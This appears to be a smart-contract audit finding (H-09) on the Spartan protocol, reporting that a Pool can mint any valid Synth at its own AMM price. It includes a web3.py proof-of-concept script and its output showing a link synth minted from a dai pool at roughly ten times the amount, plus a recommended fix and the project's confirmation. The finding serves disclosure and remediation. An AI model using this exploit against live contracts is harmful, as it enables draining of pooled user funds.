[H-09] arbitrary synth mint/burn from pool
Submitted by jonah1005
Poolcan mint arbitrarySynthprovided as long as it’s a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.
Pool’s mintSynth logic,Synth’s mintSynth logic, andSynth’s authorization logic.
The price of the synthetics to be mint is calculated inPoolbased on the AMM price of the current Pool
Here’s a web3.py script of minting arbitrarySynthin a pool.
For simplicity, two pools are set with the assumption that link is 10x expensive than dai.
sparta_amount =100*10**18initail_link_synth = link_synth.functions.balanceOf(user).call()base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})after_link_synth = link_synth.functions.balanceOf(user).call()print('get link synth amount from link pool:', after_link_synth - initail_link_synth)sparta_amount =100*10**18initail_link_synth = link_synth.functions.balanceOf(user).call()base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})after_link_synth = link_synth.functions.balanceOf(user).call()print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)
The log of the above script
getlinksynthamountfromlinkpool:97078046905036524413getlinksynthamountfromdaipool:970780469050365244136
Recommend Checking the provided synth’s underlying token inmintSynth
require(iSYNTH(synthOut).LayerONE() ==TOKEN,"invalid synth");
verifyfirst (Spartan) confirmed:
We agree and appreciate this finding being valid high risk issue.